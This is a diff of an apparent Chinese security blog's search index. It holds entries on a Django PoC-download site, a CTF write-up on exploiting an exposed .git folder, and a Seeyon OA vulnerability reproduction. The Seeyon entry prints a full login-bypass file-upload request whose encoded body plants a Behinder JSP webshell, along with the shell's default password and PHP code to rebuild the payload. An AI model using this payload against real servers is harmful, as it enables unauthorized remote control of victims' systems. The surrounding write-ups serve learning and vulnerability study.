&#x2F; sum * 100)</span><br><span class="line">    b &#x3D; int(gzzs &#x2F; sum * 100)</span><br><span class="line">    c &#x3D; int(ygzs &#x2F; sum * 100)</span><br><span class="line"></span><br><span class="line">    return render(request, &#39;index.html&#39;, &#123;&#39;sum&#39;: sum, &#39;high&#39;: high, &#39;med&#39;: med, &#39;low&#39;: low,</span><br><span class="line">                                          &#39;wgz&#39;: a, &#39;gzz&#39;: b, &#39;ygz&#39;: c,</span><br><span class="line">                                          &#39;wgzs&#39;: wgzs, &#39;gzzs&#39;: gzzs, &#39;ygzs&#39;: ygzs,</span><br><span class="line">                                          &#39;tgips&#39;: d, &#39;tg&#39;: e, &#39;ips&#39;: f,&#39;ntgips&#39;: g,</span><br><span class="line">                                          &#39;tgipss&#39;: tgips, &#39;tgs&#39;: tg, &#39;ipss&#39;: ips,&#39;ntgipss&#39;: ntgips&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>效果图：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305144403691-4928991.png" alt="image-20210305144403691"></p>
-<h6 id="0x25-文件下载"><a href="#0x25-文件下载" class="headerlink" title="0x25 文件下载"></a>0x25 文件下载</h6><p>单个poc文件下载功能，直接在页面上做了下载链接，点击即可下载对应poc：</p>
-<p>view.py：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def download_file(request, vul_id):</span><br><span class="line">    search_lists &#x3D; vul_info.objects.get(vul_id&#x3D;vul_id)</span><br><span class="line">    file_name &#x3D; search_lists.poc_file</span><br><span class="line">    the_file_name &#x3D; &#39;#文件存储的地址&#39;+ file_name</span><br><span class="line">    file &#x3D; open(the_file_name, &#39;rb&#39;)</span><br><span class="line">    response &#x3D; StreamingHttpResponse(file)</span><br><span class="line">    response[&#39;Content-Type&#39;] &#x3D; &#39;application&#x2F;octet-stream&#39;</span><br><span class="line">    response[&#39;Content-Disposition&#39;] &#x3D; &#39;attachement;filename&#x3D;&quot;&#123;0&#125;&quot;&#39;.format(file_name)</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>
-
-<p>前端：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305144648161-4928991.png" alt="image-20210305144648161"></p>
-<p>效果图：</p>
-<p><img src="/2021/03/05/django-webproject/image-20210305144804727-4928991.png" alt="image-20210305144804727"></p>
-]]></content>
-      <tags>
-        <tag>django</tag>
-        <tag>python-web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF-2020.6.12</title>
-    <url>/2020/06/12/CTF-2020.6.12/</url>
-    <content><![CDATA[<h4 id="git文件泄露导致源码泄露"><a href="#git文件泄露导致源码泄露" class="headerlink" title=".git文件泄露导致源码泄露"></a>.git文件泄露导致源码泄露</h4><p>首先，关于git：分布式版本控制系统（版本控制：记录每次文件的改动，并支持协作编辑）</p>
-<h5 id="0x1-一些用语解释："><a href="#0x1-一些用语解释：" class="headerlink" title="0x1 一些用语解释："></a>0x1 一些用语解释：</h5><a id="more"></a>
-
-<p>集中式：全部文件存在一个中央服务器中，需联网，修改时从中央服务器中取出修改完放回去。</p>
-<p>分布式：各个电脑里都有完整的版本库，修改后需推送，安全性高，可以有一个中央服务器用来方便大家交换修改的版本。</p>
-<p>版本库：仓库，目录，文件的修改删除git都可跟踪</p>
-<p>工作区和暂存区：工作区就是自身电脑可看到的目录，暂存区在版本库中，将工作区的文件添加到暂存区（git add），然后将暂存区的所有文件添加到master（git commit）。master也是分支，分支的作用是上传未写完的代码后不会让未写完的代码影响别人。</p>
-<h5 id="0x2-泄露原理："><a href="#0x2-泄露原理：" class="headerlink" title="0x2 泄露原理："></a>0x2 泄露原理：</h5><p>源码提交到远程托管网站后，从上面把源码pull到服务器时，忘记删除git文件。利用.git文件可以恢复网站的源码，源码里可能会有数据库信息。/使用git进行版本控制，对站点自动部署，配置不当会降.git文件夹直接部署到线上环境。</p>
-<p>详细解释：</p>
-<p>在一个目录中初始化后，会产生一个名叫.git的隐藏文件夹（版本库）</p>
-<p>当开发时采用以下流程时：</p>
-<p>1.初始化仓库 , 并将仓库托管在Coding或者Github上 , 便于远程协作/备份/部署<br>2.在本地进行网站开发 , 并定时提交commit , push到远程托管网站<br>3.当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站pull到Web目录下（此时会将,git文件夹下载到服务器的web目录下）<br>4.网站正常运行</p>
-<p>攻击者可以利用web目录下载Git文件夹，然后就可以利用储存的版本控制信息，完全恢复网站后台的代码和目录结构以及获取数据库信息等。</p>
-<h5 id="0x3-利用："><a href="#0x3-利用：" class="headerlink" title="0x3 利用："></a>0x3 利用：</h5><p>1、githack等：同构泄露的.git文件夹下的文件，还原重建工程源代码</p>
-<p>2、爬虫爬取整个git目录</p>
-<h5 id="0x4-修复："><a href="#0x4-修复：" class="headerlink" title="0x4 修复："></a>0x4 修复：</h5><p>1、对.git目录的访问权限进行控制</p>
-<p>2、在每次Pull后删除.git文件夹</p>
-<h5 id="0x5-利用场景实践："><a href="#0x5-利用场景实践：" class="headerlink" title="0x5 利用场景实践："></a>0x5 利用场景实践：</h5><p>git_extract下载：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
-<p>cmd命令：git_extract.py  <a href="http://xxxxx/.git/">http://xxxxx/.git/</a></p>
-<p>可扫描出.git漏洞</p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612152136482.png"></p>
-<p>点击后：</p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105110264.png"></p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105221000.png"></p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105306274.png"></p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612154814555.png"></p>
-<p>放到beyond compare（<a href="http://www.scootersoftware.com/download.php%EF%BC%89%E9%87%8C%E5%AF%B9%E6%AF%94">http://www.scootersoftware.com/download.php）里对比</a></p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105349980.png"></p>
-<p>仔细看差别：</p>
-<p>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</p>
-<p>提交即可</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>mac下pyqt5+pycharm的环境配置</title>
     <url>/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
     <content><![CDATA[<p>因为最近学习了很多，然后写了一些小的脚本，想合成一下，就研究了一下python的图形化编程，配置了一上午，也踩了点坑，终于配置成功了。</p>
@@ -1740,40 +1743,6 @@
 ]]></content>
       <tags>
         <tag>pyqt5</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>seeyonOA-ajax未授权访问及任意文件上传漏洞</title>
-    <url>/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>参考：</p>
-<a id="more"></a>
-
-<p>1、<a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html">http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</a></p>
-<p>2、宽字节：<a href="https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA">https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA</a></p>
-<h5 id="0x1-原理："><a href="#0x1-原理：" class="headerlink" title="0x1 原理："></a>0x1 原理：</h5><p>OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。</p>
-<p>CTPHandlerInterceptor先判断是否为ajax请求，生成ignoreUrl。User.isIgnoreUrl可以根据ignoreUrl判断是否需要重定向到用户登录页面。所以我们只要使用特定的ignoreUrl就可以绕过登录，访问被保护的接口，比如文件上传接口。</p>
-<h5 id="0x2-复现："><a href="#0x2-复现：" class="headerlink" title="0x2 复现："></a>0x2 复现：</h5><p>poc:</p>
-<p><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1 Host: oatest.dptech.com:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 3485</code></p>
-<p><code>managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00</code></p>
-<p>成功的话会返回：</p>
-<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113093745161.png" alt="image-20210113093745161"></p>
-<p>冰蝎连接：默认密码：rebeyond</p>
-<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113092857670.png" alt="image-20210113092857670"></p>
-<h5 id="特殊："><a href="#特殊：" class="headerlink" title="特殊："></a>特殊：</h5><p>漏洞的原理很简单，感觉学到的是关于冰蝎这个poc的生成：</p>
-<p>将冰蝎3默认的jsp的shell先做了base64的加密，然后做gzip数据的压缩</p>
-<p>gzdecode — Decodes a gzip compressed string，解压一个使用 gzip 压缩的字符串</p>
-<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113100709420.png" alt="image-20210113100709420"></p>
-<p>最后进行了 url编码</p>
-<p>可以自定义：</p>
-<p><code>$webshell = str_replace(&quot;../webapps/seeyon/&quot;,&quot;../webapps/seeyon/&quot;,$webshell); $webshell = str_replace(&quot;PeiQi.jspx&quot;,&quot;PeiQi.jspx&quot;,$webshell); $webshell = str_replace(&quot;e45e329feb5d925b&quot;,&quot;e45e329feb5d925b&quot;,$webshell);</code></p>
-<p><code>$webshell = gzencode($webshell); $webshell = iconv(&quot;ISO-8859-1&quot;,&quot;UTF-8&quot; ,$webshell); $webshell = urlencode(&quot;$webshell&quot;);</code></p>
-<p>（然后关注了一下清水川崎师傅</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>seeyon OA</tag>
       </tags>
   </entry>
   <entry>
@@ -1866,6 +1835,53 @@
       <tags>
         <tag>apaches struts2</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>seeyonOA-ajax未授权访问及任意文件上传漏洞</title>
+    <url>/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>参考：</p>
+<a id="more"></a>
+
+<p>1、<a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html">http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</a></p>
+<p>2、宽字节：<a href="https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA">https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA</a></p>
+<h5 id="0x1-原理："><a href="#0x1-原理：" class="headerlink" title="0x1 原理："></a>0x1 原理：</h5><p>OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。</p>
+<p>CTPHandlerInterceptor先判断是否为ajax请求，生成ignoreUrl。User.isIgnoreUrl可以根据ignoreUrl判断是否需要重定向到用户登录页面。所以我们只要使用特定的ignoreUrl就可以绕过登录，访问被保护的接口，比如文件上传接口。</p>
+<h5 id="0x2-复现："><a href="#0x2-复现：" class="headerlink" title="0x2 复现："></a>0x2 复现：</h5><p>poc:</p>
+<p><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1 Host: oatest.dptech.com:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 3485</code></p>
+<p><code>managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00</code></p>
+<p>成功的话会返回：</p>
+<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113093745161.png" alt="image-20210113093745161"></p>
+<p>冰蝎连接：默认密码：rebeyond</p>
+<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113092857670.png" alt="image-20210113092857670"></p>
+<h5 id="特殊："><a href="#特殊：" class="headerlink" title="特殊："></a>特殊：</h5><p>漏洞的原理很简单，感觉学到的是关于冰蝎这个poc的生成：</p>
+<p>将冰蝎3默认的jsp的shell先做了base64的加密，然后做gzip数据的压缩</p>
+<p>gzdecode — Decodes a gzip compressed string，解压一个使用 gzip 压缩的字符串</p>
+<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113100709420.png" alt="image-20210113100709420"></p>
+<p>最后进行了 url编码</p>
+<p>可以自定义：</p>
+<p><code>$webshell = str_replace(&quot;../webapps/seeyon/&quot;,&quot;../webapps/seeyon/&quot;,$webshell); $webshell = str_replace(&quot;PeiQi.jspx&quot;,&quot;PeiQi.jspx&quot;,$webshell); $webshell = str_replace(&quot;e45e329feb5d925b&quot;,&quot;e45e329feb5d925b&quot;,$webshell);</code></p>
+<p><code>$webshell = gzencode($webshell); $webshell = iconv(&quot;ISO-8859-1&quot;,&quot;UTF-8&quot; ,$webshell); $webshell = urlencode(&quot;$webshell&quot;);</code></p>
+<p>（然后关注了一下清水川崎师傅</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>seeyon OA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>世界线偏移-2021.6.10</title>
+    <url>/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/</url>
+    <content><![CDATA[<p>近期的一些小成果：</p>
+<a id="more"></a>
+
+<p>1、成长平台百分，写了不少脚本和总结</p>
